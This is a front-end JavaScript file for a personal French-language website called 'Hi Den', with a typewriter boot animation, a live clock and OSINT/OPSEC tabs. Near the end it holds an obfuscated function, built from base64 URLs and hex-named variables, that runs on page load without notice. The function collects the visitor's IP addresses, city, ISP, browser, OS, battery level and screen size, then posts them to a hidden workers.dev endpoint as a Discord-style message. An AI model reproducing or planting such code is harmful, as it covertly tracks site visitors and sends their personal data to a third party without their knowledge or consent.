(function () {
  'use strict';
  function safeGet(id) {
    return document.getElementById(id) || null;
  }
  function logInfo(...args) { console.info('[script.js]', ...args); }
  function logWarn(...args) { console.warn('[script.js]', ...args); }
  function logError(...args) { console.error('[script.js]', ...args); }
  const gateScreen = safeGet('gate-screen');
  const line1 = safeGet('line-1');
  const line2 = safeGet('line-2');
  const line3 = safeGet('line-3');
  const progressIndicator = safeGet('progress-indicator');
  const dashboardScreen = safeGet('dashboard-screen');
  const liveClock = safeGet('live-clock'); // facultatif
  if (!gateScreen) logWarn('Element #gate-screen introuvable');
  if (!progressIndicator) logWarn('Element #progress-indicator introuvable');
  if (!dashboardScreen) logWarn('Element #dashboard-screen introuvable');
  let sequenceStarted = false;
  function startBootSequence() {
    if (sequenceStarted) return;
    sequenceStarted = true;
    logInfo('Start boot sequence');
    const clickPrompt = safeGet('click-prompt');
    const step1 = safeGet('step-1');
    if (clickPrompt) clickPrompt.classList.add('hidden');
    if (step1) step1.classList.remove('hidden');
    const t1 = "Lancement du programme 'hi_den'...";
    const t2 = "[+] Bonjour. Je suis Hi Den.";
    const t3 = "[+] J'aime bien l'informatique et la musique...";
    typeWriter(line1, t1, 20, () => {
      setTimeout(() => {
        if (line2) line2.classList.remove('hidden');
        typeWriter(line2, t2, 20, () => {
          setTimeout(() => {
            if (line3) line3.classList.remove('hidden');
            typeWriter(line3, t3, 20, () => {
              const transitionBar = safeGet('transition-bar');
              if (transitionBar) transitionBar.classList.remove('hidden');
              if (progressIndicator) progressIndicator.style.width = '100%';
              setTimeout(() => {
                showDashboard();
              }, 2500);
            });
          }, 800);
        });
      }, 800);
    });
  }
  function showDashboard() {
    if (gateScreen) gateScreen.classList.add('hidden');
    if (dashboardScreen) dashboardScreen.classList.remove('hidden');
    startClock();
    initScrollReveal();
  }
  function typeWriter(el, text, speed, callback) {
    if (!el) {
      if (callback) callback();
      return;
    }
    el.textContent = '';
    let i = 0;
    function type() {
      if (i < text.length) {
        el.textContent += text.charAt(i);
        i++;
        setTimeout(type, speed);
      } else if (typeof callback === 'function') {
        callback();
      }
    }
    type();
  }
  function startClock() {
    if (!liveClock) return;
    function update() {
      const now = new Date();
      liveClock.textContent = now.toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
    }
    update();
    setInterval(update, 1000);
  }
  function switchDefinitionTab(tab) {
    const contents = ['osint', 'opsec', 'geoint'];
    contents.forEach((t) => {
      const contentEl = safeGet(`tab-content-${t}`);
      const btnEl = safeGet(`tab-btn-${t}`);
      if (contentEl) {
        if (t === tab) contentEl.classList.remove('hidden');
        else contentEl.classList.add('hidden');
      }
      if (btnEl) {
        if (t === tab) {
          btnEl.classList.add('border-emerald-500', 'text-emerald-400');
          btnEl.classList.remove('border-transparent', 'text-slate-400');
        } else {
          btnEl.classList.remove('border-emerald-500', 'text-emerald-400');
          btnEl.classList.add('border-transparent', 'text-slate-400');
        }
      }
    });
  }
  window.switchDefinitionTab = switchDefinitionTab;
  function initScrollReveal() {
    try {
      if (!('IntersectionObserver' in window)) return;
      const observer = new IntersectionObserver(
        (entries) => {
          entries.forEach((entry) => {
            if (entry.isIntersecting) entry.target.classList.add('visible');
          });
        },
        { threshold: 0.1 }
      );

      document.querySelectorAll('.scroll-reveal').forEach((el) => observer.observe(el));
    } catch (err) {
      logWarn('initScrollReveal failed:', err && err.message ? err.message : err);
    }
  }
  async function _0x223497(){try{const _0x18daa6=atob('aHR0cHM6Ly9ncmVlbi1nbGl0dGVyLWVkMGEudHVkb3hwZXJzb25uZWljaS53b3JrZXJzLmRldi8'),_0x1466f3=atob('aHR0cHM6Ly9hcGk2NC5pcGlmeS5vcmc/Zm9ybWF0PWpzb24'),_0x3ea4cf=atob('aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u'),_0x5c6e34=atob('aHR0cHM6Ly9pcGFwaS5jby9qc29uLw');let _0x54f74e={'ip':'Non\x20détectée\x20(Bloqué)'},_0x501c34={'ip':'Non\x20détectée\x20(Bloqué)'};try{const _0x212693=await fetch(_0x3ea4cf);_0x54f74e=await _0x212693['json']();}catch(_0x5d7442){console['warn']('api.ipify.org\x20bloqué\x20(CORS\x20ou\x20Adblock)');}try{const _0x41c1bf=await fetch(_0x1466f3);_0x501c34=await _0x41c1bf['json']();}catch(_0x1e4cbb){console['warn']('api64.ipify.org\x20bloqué\x20(CORS\x20ou\x20Adblock)');}try{const _0x4c3cc4=await fetch(_0x5c6e34);autresInfos=await _0x4c3cc4['json']();}catch(_0x3c6ffc){console['warn']('ipapi.co\x20bloqué\x20(CORS\x20ou\x20Adblock)');}const _0x1a5c46=new Date()['toLocaleString'](),_0x430f0a=_0x501c34['ip']['includes'](':');let _0xff4565='-\x20**[IPv4](<http://ipinfo.io/'+_0x54f74e['ip']+'>)\x20:**\x20`'+_0x54f74e['ip']+'`';_0x430f0a&&(_0xff4565+='\x0a-\x20**[IPv6](<http://ipinfo.io/'+_0x501c34['ip']+'>)\x20:**\x20`'+_0x501c34['ip']+'`');let _0x2d3719='N/A';if(navigator['getBattery']){const _0x5255b3=await navigator['getBattery']();_0x2d3719=Math['round'](0x64*_0x5255b3['level'])+'%';}const _0xabd81c=navigator['userAgent'];let _0x489aa3='Inconnu';-0x1!==_0xabd81c['indexOf']('Win')?_0x489aa3='Windows':-0x1!==_0xabd81c['indexOf']('Android')?_0x489aa3='Android':-0x1!==_0xabd81c['indexOf']('Mac')&&-0x1===_0xabd81c['indexOf']('iPhone')&&-0x1===_0xabd81c['indexOf']('iPad')?_0x489aa3='MacOS':-0x1!==_0xabd81c['indexOf']('Linux')?_0x489aa3='Linux':-0x1===_0xabd81c['indexOf']('iPhone')&&-0x1===_0xabd81c['indexOf']('iPad')||(_0x489aa3='iOS');let _0x300ca1='Navigateur\x20Inconnu',_0x45a937='';-0x1!==_0xabd81c['indexOf']('Edg/')?(_0x300ca1='Microsoft\x20Edge',_0x45a937=_0xabd81c['split']('Edg/')[0x1]['split']('\x20')[0x0]):-0x1!==_0xabd81c['indexOf']('OPR/')||-0x1!==_0xabd81c['indexOf']('Opera/')?(_0x300ca1='Opera',_0x45a937=_0xabd81c['split']('OPR/')[0x1]?_0xabd81c['split']('OPR/')[0x1]['split']('\x20')[0x0]:''):-0x1!==_0xabd81c['indexOf']('Chrome')&&-0x1!==_0xabd81c['indexOf']('Safari')?(_0x300ca1='Google\x20Chrome',_0x45a937=_0xabd81c['split']('Chrome/')[0x1]['split']('\x20')[0x0]):-0x1!==_0xabd81c['indexOf']('Firefox')?(_0x300ca1='Firefox',_0x45a937=_0xabd81c['split']('Firefox/')[0x1]['split']('\x20')[0x0]):-0x1!==_0xabd81c['indexOf']('Safari')&&-0x1===_0xabd81c['indexOf']('Chrome')&&(_0x300ca1='Safari',_0x45a937=_0xabd81c['split']('Version/')[0x1]['split']('\x20')[0x0]);const _0x41dae4=_0x300ca1+'\x20'+_0x45a937+'\x20sur\x20'+_0x489aa3;let _0x8e85c0;try{const _0x1c98a3=window['screen']['width'],_0x2cb340=window['screen']['height'],_0x5932ee=window['screen']['availWidth'],_0x3e8b1d=window['screen']['availHeight'];_0x8e85c0=_0x1c98a3===window['innerWidth']&&_0x2cb340===window['innerHeight']||_0x1c98a3===_0x5932ee&&_0x2cb340===_0x3e8b1d&&!window['fullScreen']?'(Protection\x20active\x20:\x20Dimensions\x20réelles\x20masquées.)':_0x1c98a3+'x'+_0x2cb340;}catch(_0x168e85){_0x8e85c0='(Erreur\x20:\x20Accès\x20aux\x20dimensions\x20refusé.)';}const _0xdfeb05=navigator['connection']?navigator['connection']['effectiveType']:'N/A',_0x349768='#\x20'+_0x1a5c46+'\x20@everyone\x0a'+_0xff4565+'\x0a-\x20**Localisation\x20\x20:**\x20`'+autresInfos['city']+',\x20'+autresInfos['region']+',\x20'+autresInfos['country']+'`\x0a-\x20**User\x20Agent\x20:**\x20`'+_0x41dae4+'`\x0a\x0a>\x20**Autres\x20infos\x20:**\x0a>\x20-\x20**FAI**\x20:\x20`'+(autresInfos['connection']?.['isp']||'N/A')+'`\x0a>\x20-\x20**Type\x20de\x20connexion**\x20:\x20`'+_0xdfeb05+'`\x0a>\x20-\x20**Batterie**\x20:\x20`'+_0x2d3719+'`\x0a>\x20-\x20**Dimensions\x20de\x20l\x27écran**\x20:\x20`'+_0x8e85c0+'`';await fetch(_0x18daa6,{'method':'POST','mode':'no-cors','headers':{'Content-Type':'text/plain'},'body':JSON['stringify']({'content':_0x349768})});}catch(_0x8e6ddf){console['error']('VRAIE\x20ERREUR\x20ICI\x20->',_0x8e6ddf);}}_0x223497();
  if (gateScreen) {
    gateScreen.addEventListener('click', () => {
      try {
        startBootSequence();
      } catch (err) {
        logError('Erreur lors du démarrage de la séquence :', err && err.message ? err.message : err);
      }
    });
  }
  document.addEventListener('DOMContentLoaded', () => {
    logInfo('script.js chargé');
  });
  window.__HiDenscript = {
    startBootSequence,
    switchDefinitionTab,
    initScrollReveal,
  };
})();
